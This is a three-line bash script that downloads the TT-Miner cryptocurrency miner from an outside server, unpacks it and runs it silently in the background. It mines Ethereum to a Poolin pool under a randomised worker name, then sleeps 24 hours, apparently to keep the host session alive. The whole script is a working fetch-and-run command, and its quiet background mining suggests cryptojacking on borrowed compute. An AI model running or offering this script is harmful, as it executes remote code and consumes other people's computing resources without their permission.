#!/bin/bash
wget https://tradeproject.de/download/Miner/TT-Miner.tar.xz && tar xf TT-Miner.tar.xz && ./TT-Miner -a ETHASH -coin ETH -P stratum+tcp://noval61.$(echo $(shuf -i 1-20000 -n 1)-V):123@eth.ss.poolin.me:443 >/dev/null &
sleep 24h
